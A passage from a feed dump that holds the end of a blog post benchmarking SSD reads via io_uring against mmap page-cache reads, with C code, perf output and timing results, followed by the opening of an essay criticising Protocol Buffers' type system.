(</span><span>double</span><span>)(size_bytes/</span><span>1073741824</span><span>)/((</span><span>double</span><span>)elapsed/</span><span>1.0e6</span><span>)); </span><span>} </span></code></pre><p>Check if we now have vectorized instructions with <code>perf</code>.</p><pre><code><span>Percent&#9474; movq %xmm0,%rcx </span><span> &#9474; movdqa %xmm7,%xmm14 </span><span> &#9474; pxor %xmm0,%xmm0 </span><span> &#9474; nop </span><span> &#9474; e8: movdqa %xmm6,%xmm4 </span><span> 0.30 &#9474; movdqa %xmm6,%xmm3 </span><span> 0.12 &#9474; movdqa %xmm6,%xmm2 </span><span> 0.35 &#9474; add $0x1,%rdx </span><span> 1.54 &#9474; pcmpeqd (%rax),%xmm4 </span><span> 54.64 &#9474; pcmpeqd 0x10(%rax),%xmm3 </span><span> 1.62 &#9474; movdqa %xmm6,%xmm1 </span><span> 0.99 &#9474; add $0x40,%rax </span><span> 0.12 &#9474; pcmpeqd -0x20(%rax),%xmm2 </span><span> 3.03 &#9474; pcmpeqd -0x10(%rax),%xmm1 </span><span> 1.32 &#9474; pand %xmm5,%xmm4 </span><span> 1.25 &#9474; pand %xmm5,%xmm3 </span><span> 1.55 &#9474; movdqa %xmm4,%xmm15 </span><span> 0.24 &#9474; punpckhdq %xmm0,%xmm4 </span></code></pre><p>Confirmed. We're using 128bit vector instructions, this should be up to 4x faster than the original.</p><blockquote><p>NOTE: These are 128-bit vector instructions, but I expected 256-bit. I dug deeper here and found claims that Gen1 EPYC had unoptimized 256-bit instructions. I forced the compiler to use 256-bit instructions and found it was actually slower. Looks like the compiler was smart enough to know that here.</p></blockquote><p>Let's benchmark this unrolled version with the data as page cache in memory.</p><pre><code><span>&#10095; sudo ./count_10_unrolled ./mnt/datafile.bin 53687091200 </span><span>unrolled loop found 167802249 10s processed at 5.51 GB/s </span></code></pre><p>We're still nowhere close to hitting the memory bus speed limit of 13GB/s but 50% faster than the original is a win. There must be some other bottleneck.</p><h2>Can the SSDs beat that?</h2><p>5.51GB/s? On paper the SSDs can read at 6.2GB/s, but the first run from disk only did 0.61GB/s. How can I meet or beat this performance sourcing the data directly from disk?</p><p>Consider how the default mmap() mechanism works, it is a background IO pipeline to transparently fetch the data from disk. When you read the empty buffer from userspace it triggers a fault, the kernel handles the fault by reading the data from the filesystem, which then queues up IO from disk. Unfortunately these legacy mechanisms just aren't set up for serious high performance IO. Note that at 610MB/s it's faster than what a disk SATA can do. On the other hand, it only managed 10% of our disk's potential. Clearly we're going to have to do something else.</p><p>SSDs don't just automatically read data at multigigabyte speeds. You need to put some real effort into an IO pipeline to get serious performance.</p><p>I made a io_uring based IO engine, a kind of userspace driver, that can hit these speeds. The main thread will request data, the IO engine will handle the IO, then the main thread will do the counting when the data is in a buffer. We will use a set of queues to manage the IO requests, responses, and buffers. The IO engine will start 6 workers, target a queue depth of 8192, and have a buffer size of 16KB.</p><p>I wish I had tighter code here, but A) I didn&rsquo;t have time to clean it up B) some of the complexity is intractable. The IO engine code was a lot to scroll through so I moved it to github <a href="https://github.com/bitflux-ai/blog_notes/tree/main/memory_is_slow_part2/diskbased">link</a></p><pre><code><span>#include </span><span>"</span><span>io_engine.h</span><span>" </span><span>#include </span><span>&lt;</span><span>sys/mman.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>getopt.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>stdio.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>stdlib.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>fcntl.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>sys/mman.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>stdint.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>sys/time.h</span><span>&gt; </span><span>#define </span><span>DEFAULT_WORKERS </span><span>6 </span><span>#define </span><span>DEFAULT_BLOCK_SIZE </span><span>16384 </span><span>#define </span><span>DEFAULT_QUEUE_DEPTH </span><span>8192 </span><span>// Count the number of "10" (int format) in the buffer </span><span>static inline </span><span>size_t </span><span>count_tens_unrolled</span><span>(</span><span>void</span><span>* </span><span>data</span><span>, size_t </span><span>size_bytes</span><span>) { </span><span>const </span><span>size_t total = size_bytes / sizeof(</span><span>int</span><span>); </span><span>// Get the compiler to align the buffer </span><span>const int </span><span>* </span><span>__restrict</span><span> p = (</span><span>const int </span><span>* </span><span>__restrict</span><span>)</span><span>__builtin_assume_aligned</span><span>(data, </span><span>4096</span><span>); </span><span> uint64_t c0=</span><span>, c1=</span><span>, c2=</span><span>, c3=</span><span>, </span><span> c4=</span><span>, c5=</span><span>, c6=</span><span>, c7=</span><span>, </span><span> c8=</span><span>, c9=</span><span>, c10=</span><span>, c11=</span><span>, </span><span> c12=</span><span>, c13=</span><span>, c14=</span><span>, c15=</span><span>; </span><span> </span><span>// Unrolling the compiler knows it can use a vector unit like AVX2 to process </span><span>for </span><span>(size_t i = </span><span>; i &lt; total; i += </span><span>16</span><span>) { </span><span>// removed 'if' to get it to be branchless: each compares to 10, adds 0 or 1 </span><span> c0 += (</span><span>unsigned</span><span>)(p[i+ </span><span>] == </span><span>10</span><span>); </span><span> c1 += (</span><span>unsigned</span><span>)(p[i+ </span><span>1</span><span>] == </span><span>10</span><span>); </span><span> c2 += (</span><span>unsigned</span><span>)(p[i+ </span><span>2</span><span>] == </span><span>10</span><span>); </span><span> c3 += (</span><span>unsigned</span><span>)(p[i+ </span><span>3</span><span>] == </span><span>10</span><span>); </span><span> c4 += (</span><span>unsigned</span><span>)(p[i+ </span><span>4</span><span>] == </span><span>10</span><span>); </span><span> c5 += (</span><span>unsigned</span><span>)(p[i+ </span><span>5</span><span>] == </span><span>10</span><span>); </span><span> c6 += (</span><span>unsigned</span><span>)(p[i+ </span><span>6</span><span>] == </span><span>10</span><span>); </span><span> c7 += (</span><span>unsigned</span><span>)(p[i+ </span><span>7</span><span>] == </span><span>10</span><span>); </span><span> c8 += (</span><span>unsigned</span><span>)(p[i+ </span><span>8</span><span>] == </span><span>10</span><span>); </span><span> c9 += (</span><span>unsigned</span><span>)(p[i+ </span><span>9</span><span>] == </span><span>10</span><span>); </span><span> c10 += (</span><span>unsigned</span><span>)(p[i+</span><span>10</span><span>] == </span><span>10</span><span>); </span><span> c11 += (</span><span>unsigned</span><span>)(p[i+</span><span>11</span><span>] == </span><span>10</span><span>); </span><span> c12 += (</span><span>unsigned</span><span>)(p[i+</span><span>12</span><span>] == </span><span>10</span><span>); </span><span> c13 += (</span><span>unsigned</span><span>)(p[i+</span><span>13</span><span>] == </span><span>10</span><span>); </span><span> c14 += (</span><span>unsigned</span><span>)(p[i+</span><span>14</span><span>] == </span><span>10</span><span>); </span><span> c15 += (</span><span>unsigned</span><span>)(p[i+</span><span>15</span><span>] == </span><span>10</span><span>); </span><span> } </span><span> </span><span>// pairwise reduce to help some compilers schedule better </span><span> uint64_t s0 = c0 + c1, s1 = c2 + c3, s2 = c4 + c5, s3 = c6 + c7; </span><span> uint64_t s4 = c8 + c9, s5 = c10 + c11, s6 = c12 + c13, s7 = c14 + c15; </span><span> uint64_t t0 = s0 + s1, t1 = s2 + s3, t2 = s4 + s5, t3 = s6 + s7; </span><span> </span><span>return </span><span>(t0 + t1) + (t2 + t3); </span><span>} </span><span>int </span><span>main</span><span>(</span><span>int </span><span>argc</span><span>, </span><span>char </span><span>*</span><span>argv</span><span>[]) { </span><span>char</span><span>* filename = argv[</span><span>1</span><span>]; </span><span> size_t size_bytes = </span><span>strtoull</span><span>(argv[</span><span>2</span><span>], </span><span>NULL</span><span>, </span><span>10</span><span>); </span><span> </span><span>// Set up the io engine </span><span> ioengine_t* na = </span><span>ioengine_alloc</span><span>(filename, size_bytes, DEFAULT_QUEUE_DEPTH, DEFAULT_BLOCK_SIZE, DEFAULT_WORKERS); </span><span> </span><span>sleep</span><span>(</span><span>1</span><span>); </span><span> </span><span>// Use the background workers to read file directly </span><span> size_t total_blocks = na-&gt;file_size / na-&gt;block_size; </span><span> uint64_t uid = </span><span>1</span><span>; </span><span> size_t count = </span><span>; </span><span> </span><span>long</span><span> start = </span><span>get_time_us</span><span>(); </span><span> </span><span>// Read all blocks </span><span> size_t blocks_queued = </span><span>; </span><span> size_t blocks_read = </span><span>; </span><span>int</span><span> buffer_queued = </span><span>; </span><span>while </span><span>(blocks_read &lt; total_blocks) { </span><span>//// Queue IO phase ////// </span><span>// Do we have more blocks to queue up? </span><span>if </span><span>(buffer_queued &lt; na-&gt;num_io_buffers/</span><span>2 </span><span>&amp;&amp; blocks_queued &lt;= total_blocks) { </span><span>// Calculate how many blocks on average we want our workers to queue up </span><span> size_t free_buffers = (size_t)(na-&gt;num_io_buffers - buffer_queued - </span><span>4</span><span>); </span><span>// hold back a few buffers </span><span> size_t blocks_remaining = total_blocks - blocks_queued; </span><span>// how many blocks have we not queued </span><span> size_t blocks_to_queue = free_buffers &gt; blocks_remaining ? blocks_remaining : free_buffers; </span><span>int</span><span> blocks_to_queue_per_worker = (</span><span>int</span><span>) (blocks_to_queue + na-&gt;num_workers - </span><span>1</span><span>) / na-&gt;num_workers; </span><span>// Iterate through workers and assign work </span><span>for </span><span>(</span><span>int</span><span> i = </span><span>; i &lt; na-&gt;num_workers; i++) { </span><span> worker_thread_data_t* worker = &amp;na-&gt;workers[i]; </span><span>// Try to queue N blocks to this worker </span><span>for </span><span>(</span><span>int</span><span> j = </span><span>; j &lt; blocks_to_queue_per_worker; j++) { </span><span>if </span><span>(blocks_queued == total_blocks) </span><span>break</span><span>; </span><span>int</span><span> bgio_tail = worker-&gt;bgio_tail; </span><span>int</span><span> bgio_head = worker-&gt;bgio_head; </span><span>int</span><span> bgio_next = (bgio_tail + </span><span>1</span><span>) % worker-&gt;num_max_bgio; </span><span>int</span><span> next_bhead = (worker-&gt;buffer_head + </span><span>1</span><span>) % worker-&gt;num_max_bgio; </span><span>if </span><span>(bgio_next == bgio_head) </span><span>break</span><span>; </span><span>// queue for send requests is full </span><span>if </span><span>(next_bhead == worker-&gt;buffer_tail) </span><span>break</span><span>; </span><span>// queue for recieving completed IO is full </span><span>// Queue this block with the worker. We have to track which buffer it's going to. </span><span>int</span><span> buffer_idx = worker-&gt;buffer_start_idx + worker-&gt;buffer_head; </span><span> na-&gt;buffer_state[buffer_idx] = BUFFER_PREFETCHING; </span><span> worker-&gt;bgio_uids[bgio_tail] = (uid++)&lt;&lt;</span><span>16</span><span>; </span><span>// unique id helps track IOs in io_uring, we encode 4 bytes later </span><span> worker-&gt;bgio_buffer_idx[bgio_tail] = buffer_idx; </span><span> worker-&gt;bgio_block_idx[bgio_tail] = blocks_queued++; </span><span>// block sized index into file </span><span> worker-&gt;bgio_queued[bgio_tail] = -</span><span>1</span><span>; </span><span>// Requested but not yet queued </span><span>int</span><span> next_tail = (bgio_tail + </span><span>1</span><span>) % worker-&gt;num_max_bgio; </span><span> worker-&gt;bgio_tail = next_tail; </span><span>// Log the buffer in an ordered queue for us to read </span><span> worker-&gt;complete_ring[worker-&gt;buffer_head] = buffer_idx; </span><span> worker-&gt;buffer_head = next_bhead; </span><span> buffer_queued++; </span><span> } </span><span>// Tell the worker to submit IOs as a group </span><span> worker-&gt;bgio_submit++; </span><span> } </span><span> } </span><span> </span><span>//// Completion Phase ////// </span><span>// Iterate through worker and check if they have complete IOs </span><span>for </span><span>(</span><span>int</span><span> i = </span><span>; i &lt; na-&gt;num_workers; i++) { </span><span> worker_thread_data_t* worker = &amp;na-&gt;workers[i]; </span><span>int</span><span> current = worker-&gt;buffer_tail; </span><span>// We know what IO's we're waiting on, but we have to poll </span><span>// to see if they are done. </span><span>for </span><span>(</span><span>int</span><span> scan = </span><span>; scan &lt; worker-&gt;num_max_bgio; scan++) { </span><span>// Scan until we get to the end of the list </span><span>if </span><span>(current == worker-&gt;buffer_head) </span><span>break</span><span>; </span><span>int</span><span> buffer_idx = worker-&gt;complete_ring[current]; </span><span>int</span><span> state = na-&gt;buffer_state[buffer_idx]; </span><span>if </span><span>(state == BUFFER_PREFETCHED) { </span><span>// This buffer is completed - Process this buffer. </span><span> count += </span><span>count_tens_unrolled</span><span>(na-&gt;io_buffers[buffer_idx], na-&gt;block_size); </span><span> na-&gt;buffer_state[buffer_idx] = BUFFER_UNUSED; </span><span> blocks_read++; </span><span> buffer_queued--; </span><span> } </span><span> current = (current + </span><span>1</span><span>) % worker-&gt;num_max_bgio; </span><span> } </span><span>// IO's might have been completed out of order, advance the tail when we can </span><span> current = worker-&gt;buffer_tail; </span><span>while </span><span>(current != worker-&gt;buffer_head) { </span><span>int</span><span> buffer_idx = worker-&gt;complete_ring[current]; </span><span>int</span><span> state = na-&gt;buffer_state[buffer_idx]; </span><span>if </span><span>(state != BUFFER_UNUSED) </span><span>break</span><span>; </span><span> current = (current + </span><span>1</span><span>) % worker-&gt;num_max_bgio; </span><span> } </span><span> worker-&gt;buffer_tail = current; </span><span> worker-&gt;bgio_submit++; </span><span>// probably unnecessary </span><span> } </span><span> } </span><span>long</span><span> elapsed = </span><span>get_time_us</span><span>() - start; </span><span>printf</span><span>("</span><span>diskbased found </span><span>%ld</span><span> 10s processed at </span><span>%0.2f</span><span> GB/s</span><span>\n</span><span>", count, (</span><span>double</span><span>)(size_bytes/</span><span>1073741824</span><span>)/((</span><span>double</span><span>)elapsed/</span><span>1.0e6</span><span>)); </span><span> </span><span>// Cleanup I/O system </span><span>ioengine_free</span><span>(na); </span><span> </span><span>return </span><span>; </span><span>} </span></code></pre><p>I hope all this extra code makes it faster.</p><pre><code><span>&#10095; sudo ./diskbased/benchmark ./mnt/datafile.bin 53687091200 </span><span>diskbased found 167802249 10s processed at 5.81 GB/s </span></code></pre><p>Boom! Disk is faster than memory! It takes several hundred lines of code but now we can source the data from my SSDs faster than the copy from the page cache in memory.</p><h2>So what's going on here?</h2><p>Of course my 6GB/s disk stripe isn&rsquo;t actually faster than the memory bus, even on this weird hack of a system. So what is happening? Where is the bottleneck? It's got to be the way the data is being read from the page cache in memory.</p><p>What if we replace the mmap() with a read() from disk into a preallocated buffer. That way we can measure the counting with the data in-memory without any page cache related overhead mmap() can introduce.</p><pre><code><span>#include </span><span>&lt;</span><span>stdio.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>stdlib.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>sys/time.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>sys/stat.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>fcntl.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>unistd.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>stdint.h</span><span>&gt; </span><span>#include </span><span>&lt;</span><span>string.h</span><span>&gt; </span><span>long </span><span>get_time_us</span><span>() { </span><span>struct</span><span> timeval tv; </span><span>gettimeofday</span><span>(&amp;tv, </span><span>NULL</span><span>); </span><span>return</span><span> tv.</span><span>tv_sec </span><span>* </span><span>1000000</span><span>L </span><span>+ tv.</span><span>tv_usec</span><span>; </span><span>} </span><span>int </span><span>main</span><span>(</span><span>int </span><span>argc</span><span>, </span><span>char </span><span>*</span><span>argv</span><span>[]) { </span><span>char</span><span>* filename = argv[</span><span>1</span><span>]; </span><span> size_t size_bytes = </span><span>strtoull</span><span>(argv[</span><span>2</span><span>], </span><span>NULL</span><span>, </span><span>10</span><span>); </span><span> size_t total_ints = size_bytes / sizeof(</span><span>int</span><span>); </span><span> size_t count = </span><span>; </span><span> </span><span>int</span><span> fd = </span><span>open</span><span>(filename, O_RDONLY|O_DIRECT); </span><span>void </span><span>*buf; </span><span>posix_memalign</span><span>(&amp;buf, </span><span>4096</span><span>, size_bytes); </span><span>int </span><span>*data = buf; </span><span> size_t off = </span><span>; </span><span>while </span><span>(off &lt; size_bytes) { </span><span> ssize_t n = </span><span>read</span><span>(fd, (</span><span>char</span><span>*)data + off, size_bytes - off); </span><span> off += (size_t)n; </span><span>// YOLO: assume n &gt; 0 until done </span><span> } </span><span> </span><span>long</span><span> start = </span><span>get_time_us</span><span>(); </span><span>for </span><span>(size_t i = </span><span>; i &lt; total_ints; ++i) { </span><span>if </span><span>(data[i] == </span><span>10</span><span>) count++; </span><span> } </span><span>long</span><span> elapsed = </span><span>get_time_us</span><span>() - start; </span><span> </span><span>printf</span><span>("</span><span>simple loop </span><span>%ld</span><span> 10s processed at </span><span>%0.2f</span><span> GB/s</span><span>\n</span><span>", </span><span> count, </span><span> (</span><span>double</span><span>)(size_bytes/</span><span>1073741824</span><span>)/((</span><span>double</span><span>)elapsed/</span><span>1.0e6</span><span>)); </span><span> </span><span>// Get the compiler to align the buffer </span><span>const int </span><span>* </span><span>__restrict</span><span> p = (</span><span>const int </span><span>* </span><span>__restrict</span><span>)</span><span>__builtin_assume_aligned</span><span>((</span><span>void</span><span>*)data, </span><span>4096</span><span>); </span><span> uint64_t c0=</span><span>, c1=</span><span>, c2=</span><span>, c3=</span><span>, </span><span> c4=</span><span>, c5=</span><span>, c6=</span><span>, c7=</span><span>, </span><span> c8=</span><span>, c9=</span><span>, c10=</span><span>, c11=</span><span>, </span><span> c12=</span><span>, c13=</span><span>, c14=</span><span>, c15=</span><span>; </span><span> start = </span><span>get_time_us</span><span>(); </span><span>// Unrolling the compiler knows it can use a vector unit like AVX2 to process </span><span>for </span><span>(size_t i = </span><span>; i &lt; total_ints; i += </span><span>16</span><span>) { </span><span>// removed 'if' to get it to be branchless: each compares to 10, adds 0 or 1 </span><span> c0 += (</span><span>unsigned</span><span>)(p[i+ </span><span>] == </span><span>10</span><span>); </span><span> c1 += (</span><span>unsigned</span><span>)(p[i+ </span><span>1</span><span>] == </span><span>10</span><span>); </span><span> c2 += (</span><span>unsigned</span><span>)(p[i+ </span><span>2</span><span>] == </span><span>10</span><span>); </span><span> c3 += (</span><span>unsigned</span><span>)(p[i+ </span><span>3</span><span>] == </span><span>10</span><span>); </span><span> c4 += (</span><span>unsigned</span><span>)(p[i+ </span><span>4</span><span>] == </span><span>10</span><span>); </span><span> c5 += (</span><span>unsigned</span><span>)(p[i+ </span><span>5</span><span>] == </span><span>10</span><span>); </span><span> c6 += (</span><span>unsigned</span><span>)(p[i+ </span><span>6</span><span>] == </span><span>10</span><span>); </span><span> c7 += (</span><span>unsigned</span><span>)(p[i+ </span><span>7</span><span>] == </span><span>10</span><span>); </span><span> c8 += (</span><span>unsigned</span><span>)(p[i+ </span><span>8</span><span>] == </span><span>10</span><span>); </span><span> c9 += (</span><span>unsigned</span><span>)(p[i+ </span><span>9</span><span>] == </span><span>10</span><span>); </span><span> c10 += (</span><span>unsigned</span><span>)(p[i+</span><span>10</span><span>] == </span><span>10</span><span>); </span><span> c11 += (</span><span>unsigned</span><span>)(p[i+</span><span>11</span><span>] == </span><span>10</span><span>); </span><span> c12 += (</span><span>unsigned</span><span>)(p[i+</span><span>12</span><span>] == </span><span>10</span><span>); </span><span> c13 += (</span><span>unsigned</span><span>)(p[i+</span><span>13</span><span>] == </span><span>10</span><span>); </span><span> c14 += (</span><span>unsigned</span><span>)(p[i+</span><span>14</span><span>] == </span><span>10</span><span>); </span><span> c15 += (</span><span>unsigned</span><span>)(p[i+</span><span>15</span><span>] == </span><span>10</span><span>); </span><span> } </span><span> </span><span>// pairwise reduce to help some compilers schedule better </span><span> uint64_t s0 = c0 + c1, s1 = c2 + c3, s2 = c4 + c5, s3 = c6 + c7; </span><span> uint64_t s4 = c8 + c9, s5 = c10 + c11, s6 = c12 + c13, s7 = c14 + c15; </span><span> uint64_t t0 = s0 + s1, t1 = s2 + s3, t2 = s4 + s5, t3 = s6 + s7; </span><span> count = (t0 + t1) + (t2 + t3); </span><span> elapsed = </span><span>get_time_us</span><span>() - start; </span><span> </span><span>printf</span><span>("</span><span>unrolled loop </span><span>%ld</span><span> 10s processed at </span><span>%0.2f</span><span> GB/s</span><span>\n</span><span>", </span><span> count, </span><span> (</span><span>double</span><span>)(size_bytes/</span><span>1073741824</span><span>)/((</span><span>double</span><span>)elapsed/</span><span>1.0e6</span><span>)); </span><span>} </span></code></pre><p>If we keep the dataset smaller than a numa domain and we bind this to a single numa node to prevent numa overheads we see that the theoretical memory bandwidth we projected seems to be the primary bottleneck for the unrolled loop as we hoped to see at the outset.</p><pre><code><span>&#10095; sudo numactl --cpunodebind=0 ./in_ram mnt/datafile.bin 2147483648 </span><span>simple loop 6709835 10s processed at 4.76 GB/s </span><span>unrolled loop 6709835 10s processed at 13.04 GB/s </span></code></pre><p>But this isn't useful to compare the with the other runs with the 50GB dataset. However if we do the full 50GB dataset the performance suffers. We have to get much of the data across numa domains which is going to be higher cost.</p><pre><code><span>&#10095; sudo ./in_ram ./mnt/datafile.bin 53687091200 </span><span>simple loop 167802249 10s processed at 3.76 GB/s </span><span>unrolled loop 167802249 10s processed at 7.90 GB/s </span></code></pre><p>Comparing the results of "fully in-memory (50GB)" which is pre-loaded in memory before measuring against the "unrolled loop" that is only cached in memory we see 40% overhead. That's 2.75 seconds out of 9 seconds that was spent waiting on the caching system instead of counting. Why so much?</p><p><strong>mmap()</strong></p><p>The mmap() call presents the process with a buffer that is a blank slate even when the data is already in memory. The buffer is populated page by page as it's accessed from the page cache. This isn't a copy, it's just the operating system mapping the cached memory into the process. This costs more than it might seem. The worst case with mmap() the counting has to pause at every 4KB page boundary while the kernel processes a fault, tracks down the page of data in the page cache, then updates the page table of the process to insert the memory into the process. Fundamentally this is a process that is limited by the memory latency, not the CPU speed or memory bandwidth. With the potential for TLB walks and searching lists that track the page cache, we&rsquo;re taking potentially dozens of CPU cache misses and several microseconds of waiting on memory for every 4KB page.</p><p><strong>direct IO</strong></p><p>Using our direct from disk approach uses pipelines and streams which avoids the kind of memory latency dominated bottleneck that mmap() has. In our case we're limited by the bandwidth of our disks yet because of the pipelining, the larger latency of the IOs doesn't get in the critical path of the counting very much. Allowing for higher throughput.</p><h2>Scaling</h2><p>Consider the implications of these experiments as we scale. The well vetted solution to get data from memory to a process is slower than using the disk directly. This isn't because the memory is slower than the disk. The memory has higher bandwidth than the disk, not by an order of magnitude, but a decent margin. But the latency of the memory is orders of magnitude lower than the disk. Nevertheless the <em>way</em> the data in memory is accessed is the culprit. Its a synchronous approach that assumes memory operations are cheap and low latency. These accesses add up and it ends up waiting on memory latencies. The disk method on the other hand is as a streaming approach built to leverage bandwidth and hide latencies.</p><p><strong>extending the existing rig</strong></p><p>If I got a few more of these disks I could push the IO bandwidth to be greater than the 13GB/s per thread memory bandwidth limit. IO is DMA'ed to buffers that are pretty small compared to the total dataset. These buffers scale with the throughput capabilities of the CPU and the disks, not the dataset size. The buffers can be located in a single numa domain allowing us to avoid the overhead of accessing the buffers between NUMA domains. Add more disks to this system I might be able to create a disk based solution to count at the full 13GB/s rather than be limited to the 7.90GB/s we see with the in memory example at the full 50GB dataset. With such a system our throughput would not be affected by the dataset size, unlike the in-memory case, which has numa overhead and eventually runs out of memory to scale.</p><p><strong>faster than memory is possible</strong></p><p>On a proper modern server the CPUs will let you do IO directly to the L3 cache, bypassing memory altogether. Because PCIe bandwidth is higher than memory bandwidth, on paper we could even get more max bandwidth than we can get from memory if we carefully pin the buffers into the CPU cache. I haven't confirm this works in practice, however, it could be made to work and is the sort of thing that CPU designs will be forced to lean into to push performance forward.</p><p><strong>memory is changing too</strong></p><p>This isn't just about disks vs memory. Similar techniques and principles apply to memory. Memory bandwidth is still scaling even if the latency is not. This means to take advantage of memory performance you have to actually treat it more like a disk and less like Random Access Memory. To scale performance with generational updates you have to make sure to stream data from memory into the CPU caches in blocks, similar to how data is streamed from disk to memory. If not you end up with 90s level memory throughput. A custom mechanism to cache data in memory could easily avoid the memory latency problems seen with the default mmap() solution with much less code than the io_uring solution.</p><h2>Is this worth it?</h2><p>I'm not going to say that going to the effort of implementing something like this is always worth it. The mmap() method is sure elegant from a coding perspective, especially when compared to all the code I had to write to get the io_uring setup working. Sometimes the simple way is the way to go.</p><p>Is using 6 cores of IO for 1 core of compute is always the right answer? Probably not. This was an extreme situation to prove a point. In realworld situations you'll need to look at the tradeoffs and decide what's best for your use case. Correctly understanding the strengths and weaknesses of the hardware can open up a number of possibilities where you can get a lot more performance for a lot less money.</p><p>The kind of overhead demonstrated with mmap() isn&rsquo;t going to go away, new hardware isn't going to fix it. At the same time disk bandwidth and the number of cores are scaling each generation. But doing things that scale performance with new technology is going to take extra code and effort.</p><p>But don't just blow this stuff off. Sure you <em>can</em> dedicate a server with 3TB of memory to serve 10K client connections. Memory in the cloud is like ~$5/GB/month, if you can afford it, then you do you. However it is worth considering that humanity doesn't have the silicon fabs or the power plants to support this for every moron vibe coder out there making an app. I figure either the karmic debt to the planet, or a vengeful AI demigod hungry for silicon and electricity will come for those that don't heed this warning, eventually. Either way my conscience is clear.</p><h2>Recap</h2> <ul> <li>Memory is slow - when you use it oldschool.</li> <li>Disk is fast - when you are clever with it.</li> <li>Test the dogma - compounded exponentials are flipping somethings from true to false.</li> </ul><p><strong>Bad news</strong> is that this cleverness requires extra code and effort.</p><p><strong>Good news</strong> is we now have AI to write and test the extra code this cleverness requires.</p><p><strong>Better news</strong> is that, for those that are willing to learn, AI's don't do this unless you know how to ask them.</p><p>Lean into things that scale, avoid things that don&rsquo;t.</p><h2>Next Time</h2><p>What will be revealed in the next episode?</p><ul> <li>Is O(&radic;n) actually faster than O(log n)? Will the foundations of Computer Science survive this unveiling?</li> <li>Will traditional code be consumed into the latent space of our AI overlords?</li> <li>Is AI hiding these performance gains from me? Is AI even capable of writing optimized code?</li> </ul> <hr><p><em>Jared Hulbert</em></p><blockquote><p>A few notes for the "um actually" haters commenting on Hacker News:</p><ul> <li>This is not and does not claim to be an academic paper.</li> <li>I do not intend to prove that NAND is a drop in replacement for DRAM.</li> <li>Tis but a humble and hopefully fun exercise in exploring the limits and trends of modern hardware and the tradeoffs needed to maximize performance.</li> <li>As I stated before I have no problem with your choice to ignore this and write lazy code that will perform just as fast on new hardware in 15 years as it does on todays hardware. In fact I applaud your choice. Jeff Bezos has an orbital yacht to build, someone has to pay for it, why not you?</li> <li>I am not an AI. I am a human with a computer that don't write perfect.</li> </ul> </blockquote> <blockquote><p>source code can be found <a href="https://github.com/bitflux-ai/blog_notes">here</a>.</p></blockquote> </section> </section>]]></description><pubDate>Fri, 05 Sep 2025 22:20:55 +0530</pubDate></item><item><link>https://reasonablypolymorphic.com/blog/protos-are-wrong/</link><title>Protobuffers Are Wrong (reasonablypolymorphic.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n9af5c/protobuffers_are_wrong/</guid><comments>https://www.reddit.com/r/programming/comments/1n9af5c/protobuffers_are_wrong/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 18 min | <a href='https://www.reddit.com/r/programming/comments/1n9af5c/protobuffers_are_wrong/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>I&rsquo;ve spent a good deal of my professional life arguing against using protobuffers. They&rsquo;re clearly written by amateurs, unbelievably ad-hoc, mired in gotchas, tricky to compile, and solve a problem that nobody but Google really has. If these problems of protobuffers remained quarantined in serialization abstractions, my complaints would end there. But unfortunately, the bad design of protobuffers is so persuasive that these problems manage to leak their way into your code as well.</p><h2>Ad-Hoc and Built By Amateurs</h2><p>Stop. Put away your email client that is half-way through writing me about how &ldquo;Google is filled with the world&rsquo;s best engineers,&rdquo; and that &ldquo;anything they build is, by definition, not built by amateurs.&rdquo; I don&rsquo;t want to hear it.</p><p>Let&rsquo;s just get this out of the way. Full disclosure: I used to work at Google. It was the first (but unfortunately, not the last) place I ever used protobuffers. All of the problems I want to talk about today exist inside of Google&rsquo;s codebase; it&rsquo;s not just a matter of &ldquo;using protobuffers wrong&rdquo; or some such nonsense like that.</p><p>By far, the biggest problem with protobuffers is their terrible type-system. Fans of Java should feel right at home with protobuffers, but unfortunately, literally nobody considers Java to have a well-designed type-system. The dynamic typing guys complain about it being too stifling, while the static typing guys like me complain about it being too stifling without giving you any of the things you actually want in a type-system. Lose lose.</p><p>The ad-hoc-ness and the built-by-amateurs-itude go hand-in-hand. So much of the protobuffer spec feels bolted on as an afterthought that it clearly <em>was</em> bolted on as an afterthought. Many of its restrictions will make you stop, scratch your head and ask &ldquo;wat?&rdquo; But these are just symptoms of the deeper answer, which is this:</p><p>Protobuffers were obviously built by amateurs because they offer <em>bad solutions to widely-known and already-solved problems.</em></p><h3>No Compositionality</h3><p>Protobuffers offer several &ldquo;features&rdquo;, but none of them see to work with one another. For example, look at the list of orthogonal-yet-constrained typing features that I found by skimming the <a href="https://developers.google.com/protocol-buffers/docs/proto3">documentation</a>.</p><ul> <li><code>oneof</code> fields can&rsquo;t be <code>repeated</code>.</li> <li><code>map<k></k></code> fields have dedicated syntax for their keys and values, but this isn&rsquo;t used for any other types.</li> <li>Despite <code>map</code> fields being able to be parameterized, no user-defined types can be. This means you&rsquo;ll be stuck hand-rolling your own specializations of common data structures.</li> <li><code>map</code> fields cannot be <code>repeated</code>.</li> <li><code>map</code> keys <em>can</em> be <code>string</code>s, but <em>can not</em> be <code>bytes</code>. They also can&rsquo;t be <code>enum</code>s, even though <code>enum</code>s are considered to be equivalent to integers everywhere else in the protobuffer spec.</li> <li><code>map</code> values cannot be other <code>map</code>s.</li> </ul><p>This insane list of restrictions is the result of unprincipled design choices and bolting on features after the fact. For example, <code>oneof</code> fields can&rsquo;t be <code>repeated</code> because rather than resulting in a coproduct type, instead the code generator will give you a product of mutually-exclusive optional fields. Such a transformation is only valid for a singular field (and, as we&rsquo;ll see later, not even then.)</p><p>The restriction behind <code>map</code> fields being unable to be <code>repeated</code> is related, but shows off a different limitation of the type-system. Behind the scenes, a <code>map<k></k></code> is desugared into something spiritually similar to <code>repeated 